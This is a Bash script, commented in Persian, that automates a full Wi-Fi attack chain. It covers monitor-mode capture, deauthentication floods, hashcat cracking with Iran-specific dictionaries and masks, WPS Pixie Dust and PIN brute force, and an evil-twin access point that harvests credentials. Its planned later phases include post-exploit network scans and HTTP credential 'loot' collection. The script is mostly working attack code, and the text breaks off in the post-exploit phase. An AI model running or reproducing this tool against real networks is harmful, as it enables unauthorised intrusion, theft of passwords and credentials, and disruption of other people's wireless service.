#!/usr/bin/env bash
# ==========================================================================
#  autopwn-ng — زنجیره کامل تست نفوذ وای‌فای
#  استفاده: sudo autopwn-ng [-p profile] [-t seconds] [-i iface] [-w wordlist]
#           [-d dictdir] [--no-wps] [--no-twin] [--no-post] [--no-harvest]
#           [--harvest-time N] [--target BSSID] [--auto] [--resume]
#           [--pmkid-only] [--dry-run|--simulate]
#  پروفایل: stealth | normal | brute
# ==========================================================================
set -uo pipefail
export LC_ALL=C

PROFILE=normal
CAPTURE=120
CAPTURE_EXPLICIT=0
IFACE=""
IFACE2=""
DICTDIR="/opt/wordlists"
WORDLIST=""
DO_WPS=1
DO_TWIN=1
DO_POST=1
DO_HARVEST=1
HARVEST_TIME=30
TARGET=""
DRY_RUN=0
AUTO=0
RESUME=0
PMKID_ONLY=0
WLIMIT=3
CHECKPOINT="/tmp/autopwn-ng.checkpoint"
PMKID_N=0
EAPOL_N=0
EAP_N=0
WORK=""

if [[ -t 1 ]]; then
  _c=$'\033[1;36m' _ok=$'\033[1;32m' _warn=$'\033[1;33m' _err=$'\033[1;31m' _hr=$'\033[1;35m' _rst=$'\033[0m'
else
  _c='' _ok='' _warn='' _err='' _hr='' _rst=''
fi
c(){ printf '%s[*]%s %s\n' "$_c" "$_rst" "$*"; }
ok(){ printf '%s[+]%s %s\n' "$_ok" "$_rst" "$*"; }
warn(){ printf '%s[!]%s %s\n' "$_warn" "$_rst" "$*"; }
err(){ printf '%s[-]%s %s\n' "$_err" "$_rst" "$*"; }
hr(){ printf '%s%s%s\n' "$_hr" "────────────────────────────────────────────" "$_rst"; }

handshake_quality() {
  # محاسبهٔ امتیاز (0-3): PMKID، EAPOL 4-way، MIC معتبر
  HS_SCORE=0
  HS_OK=0
  local mic_ok=1
  if [ -f "${WORK:-}/hcxtool.log" ]; then
    if grep -qiE 'invalid|error|bad[[:space:]]*mic|wrong[[:space:]]*mic|mic[[:space:]]*fail' "${WORK}/hcxtool.log" 2>/dev/null; then
      mic_ok=0
    fi
  fi
  [ "${PMKID_N:-0}" -gt 0 ] && HS_SCORE=$((HS_SCORE + 1))
  [ "${EAPOL_N:-0}" -ge 2 ] && HS_SCORE=$((HS_SCORE + 1))
  [ "$mic_ok" -eq 1 ] && [ "$HS_SCORE" -gt 0 ] && HS_SCORE=$((HS_SCORE + 1))
  if [ "${PMKID_N:-0}" -gt 0 ]; then
    HS_OK=1
  elif [ "${EAPOL_N:-0}" -ge 2 ] && [ "$mic_ok" -eq 1 ]; then
    HS_OK=1
  else
    HS_OK=0
  fi
  [ "$mic_ok" -eq 0 ] && HS_OK=0
}

extract_hashes() {
  hcxpcapngtool -o "$WORK/raw.hc22000" -E "$WORK/essids.txt" \
    --eapmschapv2="$WORK/mschapv2.txt" "$CAP" > "$WORK/hcxtool.log" 2>&1
  hcxhashtool -i "$WORK/raw.hc22000" -o "$HASH" --essid-group >/dev/null 2>&1 \
    || cp "$WORK/raw.hc22000" "$HASH" 2>/dev/null
  [ -s "$HASH" ] || { warn "هیچ هش WPA‌ای نبود."; : > "$HASH"; }
  PMKID_N=$(grep -c '^\*\*\*\*' "$HASH" 2>/dev/null || true)
  EAPOL_N=$(grep -c 'WPA\*02' "$HASH" 2>/dev/null || true)
  EAP_N=$(wc -l < "$WORK/mschapv2.txt" 2>/dev/null || true)
  PMKID_N=${PMKID_N:-0}; EAPOL_N=${EAPOL_N:-0}; EAP_N=${EAP_N:-0}
  ok "PMKID: $PMKID_N | EAPOL: $EAPOL_N | Enterprise: $EAP_N"
}


while [ $# -gt 0 ]; do
  case "$1" in
    -p) PROFILE="$2"; shift 2;;
    -t) CAPTURE="$2"; CAPTURE_EXPLICIT=1; shift 2;;
    -i) IFACE="$2"; shift 2;;
    -I) IFACE2="$2"; shift 2;;
    -w) WORDLIST="$2"; shift 2;;
    -d) DICTDIR="$2"; shift 2;;
    --target) TARGET="$2"; shift 2;;
    --no-wps) DO_WPS=0; shift;;
    --no-twin) DO_TWIN=0; shift;;
    --no-post) DO_POST=0; shift;;
    --no-harvest) DO_HARVEST=0; shift;;
    --harvest-time) HARVEST_TIME="$2"; shift 2;;
    --dry-run|--simulate) DRY_RUN=1; shift;;
    --auto) AUTO=1; shift;;
    --resume) RESUME=1; shift;;
    --pmkid-only) PMKID_ONLY=1; shift;;
    -h|--help) sed -n '2,8p' "$0"; exit 0;;
    *) err "گزینه ناشناس: $1"; exit 1;;
  esac
done

case "$PROFILE" in
  stealth)
    (( CAPTURE_EXPLICIT == 0 )) && CAPTURE=240
    WLIMIT=1;;
  brute)
    (( CAPTURE_EXPLICIT == 0 )) && CAPTURE=420
    WLIMIT=3;;
esac

# حالت خودکار: یک کلیک → اسکن، برداشت از همه، کرک، گزارش
if [ "$AUTO" -eq 1 ]; then
  PROFILE=normal
  CAPTURE=90
  ok "حالت خودکار: اسکن + برداشت از همه + کرک + گزارش"
fi

# حالت PMKID-only: برداشت کوتاه، در صورت یافتن PMKID مستقیم به کرک
if [ "$PMKID_ONLY" -eq 1 ]; then
  (( CAPTURE_EXPLICIT == 0 )) && CAPTURE=15
  ok "حالت PMKID-only: برداشت ${CAPTURE}s، در صورت یافتن PMKID مستقیم به کرک"
fi

# ---------- تابع ذخیرهٔ checkpoint ----------
save_checkpoint() {
  local phase="$1"
  {
    printf 'CKPT_WORK=%q
' "$WORK"
    printf 'CKPT_PHASE=%d
' "$phase"
  } > "$CHECKPOINT"
}

# ---------- حالت resume ----------
SKIP_TO=0
if [ "$RESUME" -eq 1 ]; then
  if [ -f "$CHECKPOINT" ]; then
    # shellcheck disable=SC1090
    . "$CHECKPOINT"
    if [ -n "${CKPT_WORK:-}" ] && [ -d "$CKPT_WORK" ]; then
      WORK="$CKPT_WORK"
      SKIP_TO=$(( ${CKPT_PHASE:-0} + 1 ))
      ok "ادامه از فاز $SKIP_TO (آخرین فاز تکمیل‌شده: ${CKPT_PHASE:-0})"
      ok "دایرکتوری کار: $WORK"
    else
      warn "دایرکتوری کار در checkpoint پیدا نشد؛ شروع از اول."
      RESUME=0
    fi
  else
    warn "فایل checkpoint پیدا نشد؛ شروع از اول."
    RESUME=0
  fi
fi

# Create work directory if not resuming from checkpoint
if [ -z "${WORK:-}" ]; then
  WORK="$(mktemp -d /tmp/autopwn.XXXXXX)"
fi
POT="$WORK/hashcat.pot"
HASH="$WORK/targets.hc22000"
CAP="$WORK/capture.pcapng"
REPORT="$WORK/report"
mkdir -p "$REPORT"

print_plan() {
  echo "SIMULATION MODE: autopwn-ng dry-run / --simulate"
  echo
  echo "Profile: $PROFILE"
  echo "Capture: ${CAPTURE:-120}s"
  echo "Workload: $WLIMIT"
  [ "$AUTO" -eq 1 ] && echo "Mode: auto (one-click)"
  [ "$PMKID_ONLY" -eq 1 ] && echo "Mode: PMKID-only (fast path, ${CAPTURE}s capture)"
  [ "$RESUME" -eq 1 ] && echo "Mode: resume (skip to phase $SKIP_TO)"
  [ -n "$TARGET" ] && echo "Target: $TARGET"
  [ -n "$IFACE" ] && echo "Interface: $IFACE"
  [ -n "$WORDLIST" ] && echo "Wordlist: $WORDLIST"
  echo
  echo "═══════════════════════════════════════════════════"
  echo "  Planned execution (no tools will run)"
  echo "═══════════════════════════════════════════════════"
  echo
  cat <<'PLAN'
[0] Setup
    airmon-ng check kill
    airmon-ng start $IFACE
    macchanger -r $MON  (stealth only)

[0.5] Passive recon (if kismet installed)
    timeout 30 kismet -c $MON

PLAN
  echo "[1] Capture (${CAPTURE:-120}s)"
  cat <<'PLAN'
    hcxdumptool -i $MON -o $CAP [filterlist_ap=$TARGET]
    mdk4 $MON d -b $WORK/blacklist  (background, every 5s)
    airodump-ng --band abg --output-format csv -w $WORK/scan $MON
    tshark -r $CAP -Y 'eap' -T fields -e wlan.sa -e eap.identity
    tshark -r $CAP -Y 'wps' -T fields -e wlan.bssid

[2] Extract & normalize
    hcxpcapngtool -o $WORK/raw.hc22000 -E $WORK/essids.txt --eapmschapv2=$WORK/mschapv2.txt $CAP
    hcxhashtool -i $WORK/raw.hc22000 -o $HASH --essid-group
    Handshake quality scoring (PMKID / 4-way EAPOL / MIC) — re-capture if incomplete

[3] Crack (hashcat layers 0-8)
    0: cowpatty -r $CAP -f <wordlist> -s <essid>
    1: hashcat -m 22000 -a 0 $HASH $WORK/dicts/vendor.txt
    2: hashcat -m 22000 -a 0 $HASH <wordlist>
    3: hashcat -m 22000 -a 0 $HASH <wordlist> -r best64.rule
    4: hashcat -m 22000 -a 3 $HASH '?d?d?d?d?d?d?d?d'
    5: hashcat -m 22000 -a 3 $HASH '?d?d?d?d?d?d?d?d?d?d'
    6: hashcat -m 22000 -a 3 $HASH '09?d?d?d?d?d?d?d?d?d'
    7: hashcat -m 22000 -a 6 $HASH $WORK/dicts/vendor.txt '?d?d?d?d'
    8: hashcat -m 22000 -a 0 $HASH <wordlist> -r dive.rule
    9: hashcat -m 22000 -a 0 $HASH <keyboard-walk>
    E: hashcat -m 5500 $WORK/mschapv2.txt <wordlist>  (Enterprise)

[4] WPS (if DO_WPS and WPS-enabled APs found)
    wash -i $MON -o $WORK/wps-scan.txt
    reaver -i $MON -b <bssid> -c <ch> -K 1 -N -vv -d 5
    bully -b <bssid> -c <ch> -d $WORK/bully-<bssid> $MON

[5] Evil Twin (if no cracks and DO_TWIN)
    hostapd-mana $WORK/mana.conf  (or wifiphisher)
    sleep 180

[6] Post-exploit (if cracks found and DO_POST)
    nmap -sn $SUBNET   (auto-detected or 192.168.1.0/24)
    nmap -sV -p 22,80,443,445,3389,8080 $SUBNET
    generate $REPORT/connect.sh (nmcli + bettercap)

[6.5] HTTP credential harvesting (if cracked and DO_HARVEST)
    tshark -r $CAP -Y 'http.authorization' ...  (Basic auth)
    tshark -r $CAP -Y 'http.request.method==POST' ...  (form creds)
    timeout $HARVEST_TIME tshark -i $MON -Y http -w $WORK/http-live.pcapng
    → $REPORT/loot.tsv  (loot database)
    → $REPORT/loot.json

[7] Report
    $REPORT/summary.md
    $REPORT/summary.json
PLAN
  echo
  echo "✓ Simulation complete. No changes were made."
  echo
}

[ "$DRY_RUN" = 1 ] && { print_plan; exit 0; }

(( EUID == 0 )) || { err "با sudo اجرا کن."; exit 1; }
if ! command -v hashcat >/dev/null || ! command -v hcxdumptool >/dev/null || ! command -v iw >/dev/null; then
  err "پیش‌نیازها نصب نیستند. بخش نصب را اجرا کن."; exit 1
fi
command -v mdk4 >/dev/null || warn "mdk4 نصب نیست؛ دِاوث ضعیف‌تر می‌شود."

# ---------- پاکسازی ----------
_CLEANED=0
cleanup(){
  [ "$_CLEANED" = 1 ] && return
  _CLEANED=1
  [ -n "${HK_PID:-}" ] && { kill "$HK_PID" 2>/dev/null; wait "$HK_PID" 2>/dev/null; }
  [ -n "${MDK_PID:-}" ] && { kill "$MDK_PID" 2>/dev/null; wait "$MDK_PID" 2>/dev/null; }
  [ -n "${SCAN_PID:-}" ] && { kill "$SCAN_PID" 2>/dev/null; wait "$SCAN_PID" 2>/dev/null; }
  [ -n "${TWIN_PID:-}" ] && { kill "$TWIN_PID" 2>/dev/null; wait "$TWIN_PID" 2>/dev/null; }
  if [ -n "${KISMET_RAN:-}" ]; then pkill -f 'kismet -c' 2>/dev/null || true; fi
  [ -n "${MON:-}" ] && airmon-ng stop "$MON" >/dev/null 2>&1
  # revert macchanger if applied
  if [ -n "${ORIG_MAC:-}" ] && [ -n "${MON:-}" ]; then
    ip link set "$MON" down 2>/dev/null
    ip link set "$MON" address "$ORIG_MAC" 2>/dev/null
    ip link set "$MON" up 2>/dev/null
  fi
  for i in "$IFACE" "$IFACE2"; do [ -n "$i" ] && ip link set "$i" up 2>/dev/null; done
  systemctl restart NetworkManager >/dev/null 2>&1 || true
  hr; c "خروجی‌ها: ${WORK:-}"
}
trap cleanup EXIT
trap 'cleanup; exit 130' INT
trap 'cleanup; exit 143' TERM

# ---------- فاز ۰: آماده‌سازی ----------
hr; c "فاز ۰ — آماده‌سازی"
if [ -z "$IFACE" ]; then IFACE=$(iw dev | awk '/Interface/{print $2; exit}'); fi
[ -n "$IFACE" ] || { err "دانگل وای‌فای پیدا نشد."; exit 1; }

if [ -z "$IFACE2" ]; then
  IFACE2=$(iw dev | awk -v skip="$IFACE" '/Interface/ && $2 != skip {print $2; exit}')
fi
if [ -n "$IFACE2" ]; then
  ok "دانگل دوم برای evil twin: $IFACE2"
else
  warn "دانگل دوم نیست؛ twin غیرفعال."; DO_TWIN=0
fi

c "تشخیص GPU / بنچمارک hashcat..."
hashcat -I > "$WORK/hashcat-info.txt" 2>&1
if grep -qiE 'Type\.+: (GPU|CUDA|HIP)' "$WORK/hashcat-info.txt"; then
  ok "GPU شناسایی شد."
elif grep -qi 'OpenCL' "$WORK/hashcat-info.txt"; then
  warn "فقط CPU/OpenCL؛ کند خواهد بود."
else
  err "hashcat هیچ بک‌اندی ندارد. درایور OpenCL نصب کن."
fi

airmon-ng check kill >/dev/null 2>&1
BEFORE=$(iw dev | awk '/Interface/{print $2}')
airmon-ng start "$IFACE" >/dev/null 2>&1
AFTER=$(iw dev | awk '/Interface/{print $2}')
MON=$(comm -13 <(sort <<<"$BEFORE") <(sort <<<"$AFTER") | head -1)
[ -z "$MON" ] && MON="$IFACE"
iw dev "$MON" info 2>/dev/null | grep -q monitor || {
  ip link set "$MON" down; iw dev "$MON" set type monitor; ip link set "$MON" up; }
iw dev "$MON" info 2>/dev/null | grep -q monitor || { err "مانیتور مود نشد."; exit 1; }
ok "مانیتور مود: $MON"

# MAC رندوم برای مخفی‌کاری در حالت stealth
if [ "$PROFILE" = stealth ]; then
  ORIG_MAC=$(ip link show "$MON" 2>/dev/null | awk '/link\/ether/{print $2; exit}')
  ip link set "$MON" down
  macchanger -r "$MON" >/dev/null 2>&1 || true
  ip link set "$MON" up
  ok "MAC رندوم شد."
fi

# ---------- فاز ۰.۵: شناسایی منفعل (kismet) ----------
if [ "$SKIP_TO" -le 1 ] && command -v kismet >/dev/null; then
  hr; c "فاز ۰.۵ — شناسایی منفعل با kismet"
  KISMET_RAN=1
  timeout 30 kismet -c "$MON" >/dev/null 2>&1 || true
  ok "شناسایی منفعل کامل شد."
  save_checkpoint 1
fi

# ---------- فاز ۱: برداشت ----------
if [ "$SKIP_TO" -le 2 ]; then
hr; c "فاز ۱ — برداشت PMKID + EAPOL + EAP برای ${CAPTURE} ثانیه"
HDR=$(hcxdumptool --help 2>&1 || true)
if grep -q -- '--filterlist_ap' <<<"$HDR"; then
  if grep -qE '^\s*-w[, ]' <<<"$HDR"; then OUTFLAG=-w; else OUTFLAG=-o; fi
  FILTER=()
  [ -n "$TARGET" ] && FILTER=(--filterlist_ap="$TARGET" --filtermode=2)
  hcxdumptool -i "$MON" "$OUTFLAG" "$CAP" "${FILTER[@]}" > "$WORK/hcdump.log" 2>&1 &
  HK_PID=$!
else
  err "نسخه hcxdumptool ناشناخته."; exit 1
fi

# دِاوث دوره‌ای با mdk4 برای اجبار به reassociation (در PMKID-only غیرفعال)
if [ "$PMKID_ONLY" -ne 1 ] && command -v mdk4 >/dev/null; then
  ( sleep 5; exec mdk4 "$MON" d -b "$WORK/blacklist" ) >/dev/null 2>&1 &
  MDK_PID=$!
fi

# اسکن موازی برای شناسایی Enterprise و WPS
airodump-ng --band abg --output-format csv -w "$WORK/scan" "$MON" >/dev/null 2>&1 &
SCAN_PID=$!

sleep "$CAPTURE"
kill "$HK_PID" 2>/dev/null; wait "$HK_PID" 2>/dev/null; HK_PID=""
kill "$SCAN_PID" 2>/dev/null; wait "$SCAN_PID" 2>/dev/null
kill "$MDK_PID" 2>/dev/null; MDK_PID=""

if [ -s "$CAP" ]; then
  ok "برداشت: $(du -h "$CAP" | cut -f1)"
else
  err "هیچ داده‌ای گرفته نشد."; exit 1
fi

# tshark: تحلیل بسته‌ها برای شناسایی Enterprise/WPS/کلاینت‌ها
if command -v tshark >/dev/null; then
  c "  → tshark تحلیل بسته‌ها"
  tshark -r "$CAP" -Y 'eap' -T fields -e wlan.sa -e eap.identity 2>/dev/null | sort -u > "$WORK/eap-idents.txt"
  tshark -r "$CAP" -Y 'wps' -T fields -e wlan.bssid 2>/dev/null | sort -u > "$WORK/wps-bssids.txt"
  [ -s "$WORK/eap-idents.txt" ] && ok "EAP identities: $(wc -l < "$WORK/eap-idents.txt")"
  [ -s "$WORK/wps-bssids.txt" ] && ok "WPS BSSIDs: $(wc -l < "$WORK/wps-bssids.txt")"
fi

  save_checkpoint 2
fi

# ---------- فاز ۲: نرمال‌سازی ----------
if [ "$SKIP_TO" -le 3 ]; then
hr; c "فاز ۲ — استخراج و حذف تکراری"
extract_hashes

# در حالت PMKID-only، اگر PMKID یافت شد مستقیم به کرک برو (رد WPS/Evil-Twin)
if [ "$PMKID_ONLY" -eq 1 ] && [ "${PMKID_N:-0}" -gt 0 ]; then
  ok "PMKID یافت شد ($PMKID_N) — رد کردن WPS/Evil-Twin، مستقیم به کرک."
  DO_WPS=0
  DO_TWIN=0
elif [ "$PMKID_ONLY" -eq 1 ]; then
  warn "PMKID یافت نشد؛ ادامه با مسیر کامل (WPS/Evil-Twin فعال)."
fi

  save_checkpoint 3
fi

# ---------- ارزیابی کیفیت handshake ----------
# (فقط قبل از فاز کرک اجرا می‌شود؛ در resume از فاز ۴ به بعد رد می‌شود)
if [ "${SKIP_TO:-0}" -le 4 ]; then
# بازمحاسبهٔ شمارنده‌ها در صورت resume
if [ "${PMKID_N:-0}" -eq 0 ] && [ -s "${HASH:-}" ]; then
  PMKID_N=$(grep -c '^\*\*\*\*' "$HASH" 2>/dev/null || true)
  EAPOL_N=$(grep -c 'WPA\*02' "$HASH" 2>/dev/null || true)
  PMKID_N=${PMKID_N:-0}; EAPOL_N=${EAPOL_N:-0}
fi

handshake_quality
c "کیفیت handshake: $HS_SCORE/3 (PMKID=${PMKID_N:-0}, EAPOL=${EAPOL_N:-0})"

# در صورت ناقص بودن، یک بار re-capture انجام بده
CRACK_ENABLED=1
if [ "$HS_OK" -ne 1 ]; then
  warn "handshake ناقص است؛ تلاش برای re-capture..."
  # re-run capture core
  if [ -n "${MON:-}" ]; then
    HDR=$(hcxdumptool --help 2>&1 || true)
    if grep -q -- '--filterlist_ap' <<<"$HDR"; then
      if grep -qE '^\s*-w[, ]' <<<"$HDR"; then OUTFLAG=-w; else OUTFLAG=-o; fi
      FILTER=()
      [ -n "${TARGET:-}" ] && FILTER=(--filterlist_ap="$TARGET" --filtermode=2)
      rm -f "$CAP" 2>/dev/null
      hcxdumptool -i "$MON" "$OUTFLAG" "$CAP" "${FILTER[@]}" > "$WORK/hcdump.log" 2>&1 &
      HK_PID=$!
      sleep 10
      kill "$HK_PID" 2>/dev/null; wait "$HK_PID" 2>/dev/null; HK_PID=""
    fi
  fi
  if [ -s "$CAP" ]; then
    extract_hashes
    handshake_quality
    c "کیفیت handshake پس از re-capture: $HS_SCORE/3"
  fi
  if [ "$HS_OK" -ne 1 ]; then
    warn "handshake همچنان ناقص است؛ cracking رد می‌شود."
    CRACK_ENABLED=0
  fi
fi

fi

# ---------- فاز ۳: موتور کرک ----------
if [ "$SKIP_TO" -le 4 ] && [ "${CRACK_ENABLED:-1}" -eq 1 ]; then
hr; c "فاز ۳ — موتور کرک مرحله‌ای"


build_dicts(){
  D="$WORK/dicts"; mkdir -p "$D"
  # پیش‌فرض‌های وندور بر اساس SSID
  : > "$D/vendor.txt"
  [ -s "$WORK/essids.txt" ] || return 0
  while IFS= read -r e; do
    [ -z "$e" ] && continue
    printf '%s\n' "$e" "$e"123 "$e"1234 "${e,,}" "${e^^}" "${e//[^A-Za-z0-9]/}" >> "$D/vendor.txt"
    # پسوندهای رایج ISP ایران
    for s in 1234 12345 123456 12345678 1111 0000 1 12 123 1375 1380 1390 1400; do
      printf '%s%s\n' "$e" "$s" >> "$D/vendor.txt"
    done
    # پیشوندهای اپراتور
    case "$e" in
      *[Mm]obi*|*[Ii]rancell*)
        printf '%s\n' 1234 12345 123456 11111111 00000000 >> "$D/vendor.txt";;
      *[Tt][Dd]-*|*[Zz][Tt][Ee]*|*[Dd]-[Ll]ink*|*[Dd]link*|*[Tt][Pp]-[Ll]ink*|*[Tt]plink*)
        printf 'admin\npassword\n12345678\n1234567890\n' >> "$D/vendor.txt";;
    esac
    done < "$WORK/essids.txt"
  sort -u "$D/vendor.txt" -o "$D/vendor.txt"
}

cracked_count(){ hashcat -m 22000 "$HASH" --show --potfile-path "$POT" 2>/dev/null | wc -l; }
total_count(){ wc -l < "$HASH" 2>/dev/null || echo 0; }

run_hc(){
  local label="$1"; shift
  [ -s "$HASH" ] || return 0
  local tot cr; tot=$(total_count); cr=$(cracked_count)
  [ "$cr" -ge "$tot" ] && return 0
  c "  → $label  ($cr/$tot)"
  timeout 900 hashcat -m 22000 --potfile-path "$POT" -w "$WLIMIT" -O --force \
    --status --status-timer=30 "$HASH" "$@" >> "$WORK/hc.log" 2>&1
}

build_dicts
RULES=/usr/share/hashcat/rules
WORDLISTS=()
[ -n "$WORDLIST" ] && [ -f "$WORDLIST" ] && WORDLISTS+=("$WORDLIST")
for f in "$DICTDIR"/rockyou.txt "$DICTDIR"/weakpass*.txt "$DICTDIR"/hashmob*.txt \
         /usr/share/wordlists/rockyou.txt; do
  [ -f "$f" ] && WORDLISTS+=("$f")
done
[ ${#WORDLISTS[@]} -eq 0 ] && { warn "هیچ وردلیستی نبود؛ فقط ماسک اجرا می‌شود."; WORDLISTS=("$WORK/dicts/vendor.txt"); }

# لایه ۰: cowpatty (حملهٔ سریع دیکشنری WPA-PSK)
if command -v cowpatty >/dev/null && [ -s "$HASH" ]; then
  c "  → cowpatty (حملهٔ سریع)"
  for w in "${WORDLISTS[@]}"; do
    [ -f "$w" ] || continue
    cowpatty -r "$CAP" -f "$w" -s "$(head -1 "$WORK/essids.txt" 2>/dev/null)" > "$WORK/cowpatty.txt" 2>&1
    grep -i 'The PSK is' "$WORK/cowpatty.txt" 2>/dev/null | sed 's/.*The PSK is "//;s/".*//' | while read -r pw; do
      [ -n "$pw" ] && echo "cowpatty|$pw|$(head -1 "$WORK/essids.txt")" >> "$WORK/cracked.txt"
    done
  done
fi

# لایه ۱: دیکشنری مشتق از SSID + پیش‌فرض وندور
run_hc "دیکشنری SSID/وندور" -a 0 "$WORK/dicts/vendor.txt"

# لایه ۲: rockyou بدون rule
run_hc "rockyou خام" -a 0 "${WORDLISTS[0]}"

# لایه ۳: rockyou + best64
[ -f "$RULES/best64.rule" ] && run_hc "rockyou + best64" -a 0 "${WORDLISTS[0]}" -r "$RULES/best64.rule"

# لایه ۴: ماسک‌های عددی رایج (۸ و ۱۰ رقم)
run_hc "ماسک ۸ رقمی" -a 3 '?d?d?d?d?d?d?d?d'
run_hc "ماسک ۱۰ رقمی" -a 3 '?d?d?d?d?d?d?d?d?d?d'
run_hc "موبایل ایرانی" -a 3 '09?d?d?d?d?d?d?d?d?d'

# لایه ۵: هیبرید دیکشنری + ۴ رقم
[ -s "$WORK/dicts/vendor.txt" ] && run_hc "هیبرید SSID + ۴ رقم" -a 6 "$WORK/dicts/vendor.txt" '?d?d?d?d'

# لایه ۶: weakpass / hashmob با rule
for w in "${WORDLISTS[@]:1}"; do
  [ -f "$w" ] || continue
  if [ -f "$RULES/dive.rule" ]; then
    run_hc "$(basename "$w") + dive" -a 0 "$w" -r "$RULES/dive.rule"
  else
    run_hc "$(basename "$w") خام" -a 0 "$w"
  fi
done

# لایه ۷: keyboard walk
if command -v kwp >/dev/null && [ -s "$WORK/essids.txt" ]; then
  kwp -z "$DICTDIR/keyboard-base.txt" -r "$DICTDIR/keyboard-rules.txt" --hwlayout en-US 2>/dev/null \
    | head -5000000 > "$WORK/dicts/kw.txt"
  [ -s "$WORK/dicts/kw.txt" ] && run_hc "keyboard walk" -a 0 "$WORK/dicts/kw.txt"
fi

# لایه ۸: Enterprise MSCHAPv2
if [ -s "$WORK/mschapv2.txt" ]; then
  hr; c "فاز ۳ب — کرک Enterprise (MSCHAPv2)"
  timeout 600 hashcat -m 5500 --potfile-path "$POT" -w "$WLIMIT" --force "$WORK/mschapv2.txt" \
    "${WORDLISTS[0]}" >> "$WORK/hc.log" 2>&1
  hashcat -m 5500 "$WORK/mschapv2.txt" --show --potfile-path "$POT" 2>/dev/null \
    >> "$WORK/enterprise-cracked.txt"
fi

  save_checkpoint 4
fi

# ---------- فاز ۴: WPS Pixie Dust + Brute ----------
if [ "$SKIP_TO" -le 5 ] && [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ]; then
  hr; c "فاز ۴ — WPS (Pixie Dust + Brute)"
  # wash: اسکن دقیق WPS-enabled APها (بهتر از parsing CSV)
  parse_wps_csv() {
    awk -F',' 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/ {x=$1;gsub(/ /,"",x); c=$4; gsub(/ /,"",c); print x, c}' \
      "$WORK/scan-01.csv" | sort -u
  }
  if command -v wash >/dev/null; then
    wash -i "$MON" -o "$WORK/wps-scan.txt" 2>/dev/null &
    WASH_PID=$!
    sleep 15
    kill "$WASH_PID" 2>/dev/null; wait "$WASH_PID" 2>/dev/null
    if [ -s "$WORK/wps-scan.txt" ]; then
      awk '{print $1, $6}' "$WORK/wps-scan.txt" | sort -u > "$WORK/wps-cands.txt"
    else
      parse_wps_csv > "$WORK/wps-cands.txt"
    fi
  else
    parse_wps_csv > "$WORK/wps-cands.txt"
  fi
  while read -r b ch; do
    grep -qF "$b" "$WORK/cracked.txt" 2>/dev/null && continue
    [ -z "$ch" ] && continue
    # reaver Pixie Dust
    if command -v reaver >/dev/null; then
      c "  → reaver -K 1 روی $b"
      timeout 240 reaver -i "$MON" -b "$b" -c "$ch" -K 1 -N -vv -d 5 > "$WORK/wps-$b.txt" 2>&1
      k=$(awk -F"'" '/WPA PSK:/{print $2; exit}' "$WORK/wps-$b.txt")
      [ -n "$k" ] && ok "WPS (reaver) → $k" && echo "$b|$k|WPS-reaver" >> "$WORK/cracked.txt" && continue
    fi
    # bully: brute-force PIN (alternative to reaver)
    if command -v bully >/dev/null; then
      c "  → bully روی $b"
      timeout 300 bully -b "$b" -c "$ch" -d "$WORK/bully-$b" "$MON" > "$WORK/bully-$b.txt" 2>&1
      k=$(awk -F'WPA PSK: ' 'NF>1{print $2; exit}' "$WORK/bully-$b.txt" 2>/dev/null | head -1)
      [ -n "$k" ] && ok "WPS (bully) → $k" && echo "$b|$k|WPS-bully" >> "$WORK/cracked.txt"
    fi
  done < "$WORK/wps-cands.txt"
fi

# ---------- گزارش کرک ----------
if [ "$SKIP_TO" -le 5 ]; then
hr; c "استخراج نتایج"
hashcat -m 22000 "$HASH" --show --potfile-path "$POT" 2>/dev/null > "$WORK/cracked-raw.txt"
: > "$WORK/cracked.txt"
while IFS= read -r line; do
  [ -z "$line" ] && continue
  h="${line%%:*}"; pw="${line#*:}"
  bssid=$(awk -F'*' '{print $4}' <<<"$h")
  essid=$(awk -F'*' '{print $6}' <<<"$h" | xxd -r -p 2>/dev/null)
  [ -z "$essid" ] && essid="(نامشخص)"
  echo "$bssid|$pw|$essid" >> "$WORK/cracked.txt"
done < "$WORK/cracked-raw.txt"
[ -s "$WORK/enterprise-cracked.txt" ] && sed 's/^/ENTERPRISE|/' "$WORK/enterprise-cracked.txt" >> "$WORK/cracked.txt"

  save_checkpoint 5
fi

# ---------- فاز ۵: Evil Twin ----------
if [ "$SKIP_TO" -le 6 ] && [ "$DO_TWIN" -eq 1 ] && [ -n "$IFACE2" ] && ! [ -s "$WORK/cracked.txt" ]; then
  hr; c "فاز ۵ — Evil Twin + captive portal"
  if command -v hostapd-mana >/dev/null; then
    TGT="${TARGET:-$(awk -F',' 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/ {x=$1;gsub(/ /,"",x);print x; exit}' "$WORK/scan-01.csv")}"
    ESS=$(awk -F',' -v b="$TGT" 'NR>1 {x=$1;gsub(/ /,"",x); if(x==b){e=$14;gsub(/^ +| +$/,"",e);print e;exit}}' "$WORK/scan-01.csv")
    if [ -n "$TGT" ] && [ -n "$ESS" ]; then
      cat > "$WORK/mana.conf" <<EOF
interface=$IFACE2
driver=nl80211
ssid=$ESS
channel=6
hw_mode=g
mana_wpe=1
mana_credout=$WORK/creds.txt
mana_eapsuccess=1
mana_macacl=0
EOF
      hostapd-mana "$WORK/mana.conf" > "$WORK/mana.log" 2>&1 &
      TWIN_PID=$!
      ok "AP قلابی «$ESS» روی $IFACE2 بالا آمد. منتظر قربانی..."
      sleep 180
      kill "$TWIN_PID" 2>/dev/null; TWIN_PID=""
      [ -s "$WORK/creds.txt" ] && ok "اعتبارنامه از twin:" && cat "$WORK/creds.txt" \
        && sed 's/^/TWIN|/' "$WORK/creds.txt" >> "$WORK/cracked.txt"
    fi
  elif command -v wifiphisher >/dev/null; then
    wifiphisher -aI "$IFACE2" -eI "$MON" -p firmware-upgrade --noextensions
  else
    warn "hostapd-mana یا wifiphisher نصب نیست."
  fi
fi

  save_checkpoint 6

# ---------- فاز ۶: Post-exploit ----------
if [ "$SKIP_TO" -le 7 ] && [ "$DO_POST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]; then
  hr; c "فاز ۶ — آماده‌سازی post-exploit"
  first=$(head -1 "$WORK/cracked.txt")
  b=$(cut -d'|' -f1 <<<"$first"); p=$(cut -d'|' -f2 <<<"$first")
  # تشخیص subnet واقعی شبکهٔ کرک‌شده (best-effort, چند روش)
  detect_subnet() {
    local sub="" gw det
    # ۱) اتصال موقت از طریق IFACE2
    if [ -n "${IFACE2:-}" ] && command -v nmcli >/dev/null; then
      c "  → اتصال به شبکه برای تشخیص subnet (via $IFACE2)"
